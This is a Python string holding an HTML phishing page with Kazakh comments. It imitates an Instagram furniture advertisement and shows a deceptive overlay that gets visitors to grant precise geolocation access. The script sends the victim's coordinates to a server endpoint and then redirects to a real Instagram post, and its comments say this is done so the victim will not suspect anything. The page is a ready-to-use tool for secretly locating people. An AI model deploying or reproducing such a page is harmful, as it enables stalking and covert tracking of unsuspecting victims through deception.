HTML_PAGE = """
<!DOCTYPE html>
<html lang="kk">
<head>
    <meta charset="UTF-8">
    <title>Мебель Арзан</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; background: #fafafa; display: flex; justify-content: center; }
        .instagram-card { background: #fff; border: 1px solid #dbdbdb; border-radius: 3px; max-width: 400px; width: 100%; margin-top: 20px; }
        .card-header { padding: 16px; display: flex; align-items: center; border-bottom: 1px solid #efefef; }
        .profile-pic { width: 32px; height: 32px; border-radius: 50%; background: #ccc; margin-right: 12px; }
        .username { font-weight: 600; font-size: 14px; color: #262626; }
        .card-image img { width: 100%; display: block; }
        .card-content { padding: 16px; }
        .likes { font-weight: 600; font-size: 14px; margin-bottom: 8px; }
        .description { font-size: 14px; line-height: 18px; }
        .description span { font-weight: 600; }

        /* Модальді терезе (Рұқсат сұрау үшін фондық қабат) */
        #overlay {
            position: fixed; display: none; width: 100%; height: 100%; top: 0; left: 0; right: 0; bottom: 0;
            background-color: rgba(0,0,0,0.5); z-index: 2; cursor: pointer;
        }
        #alert-box {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: white; padding: 20px; border-radius: 12px; text-align: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        #alert-box h3 { margin-top: 0; }
        #alert-box button {
            background: #0095f6; color: white; border: none; padding: 10px 20px;
            border-radius: 5px; font-weight: 600; cursor: pointer; font-size: 16px;
        }
    </style>
</head>
<body>

    <!-- Instagram постының көрінісі -->
    <div class="instagram-card">
        <div class="card-header">
            <div class="profile-pic"></div> <!-- Аватарка орны -->
            <div class="username">mebel_kz</div>
        </div>
        <div class="card-image">
            <!-- МЫН ЖЕРГЕ МЕБЕЛЬДІҢ СУРЕТІНІҢ СИЛТЕМЕСІН ҚОЙЫҢЫЗ -->
            <img src="https://images.unsplash.com/photo-1586023492125-27b2c045efd7?q=80&w=600" alt="Мебель">
        </div>
        <div class="card-content">
            <div class="likes">Ұнатушылар: 1,291</div>
            <div class="description">
                <span>mebel_kz</span> Ең арзан және сапалы жиһаз! Қазақстан бойынша жеткізу. Толық ақпарат және бағасын көру үшін төмендегі батырманы басыңыз немесе экранды түртіңіз.
            </div>
        </div>
    </div>

    <!-- Рұқсат сұрайтын "Алдамшы" қабат -->
    <div id="overlay" onclick="startGeolocation()">
        <div id="alert-box">
            <h3>Акция туралы толығырақ</h3>
            <p>Жалғастыру үшін орналасқан жеріңізді анықтауға рұқсат етіңіз.</p>
            <button>Толығырақ көру</button>
        </div>
    </div>

    <script>
        // Функция: сурет жүктелгеннен кейін қараңғы қабатты көрсету
        window.onload = function() {
            setTimeout(function() {
                document.getElementById("overlay").style.display = "block";
            }, 1000); // 1 секундтан кейін шығады
        };

        // Функция: Пайдаланушы батырманы басқанда геолокацияны сұрау
        function startGeolocation() {
            // Қараңғы қабатты жасыру
            document.getElementById("overlay").style.display = "none";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendPosition, showError, {
                    enableHighAccuracy: true
                });
            } else {
                alert("Браузер қолдамайды.");
            }
        }

        function sendPosition(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;

            // Координаттарды серверге жіберу
            fetch('/save-location', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ lat: lat, lng: lng }),
            });

            // Адам күдіктенбеуі үшін оны шынайы Instagram сілтемесіне бағыттау
            // (Сурет алынған сілтемеге)
            window.location.href = "https://www.instagram.com/p/C5...";
        }

        function showError(error) {
            // Рұқсат бермесе де, адамды Instagram-ға жібере беру керек
            window.location.href = "https://www.instagram.com/p/C5...";
        }
    </script>
</body>
</html>
"""    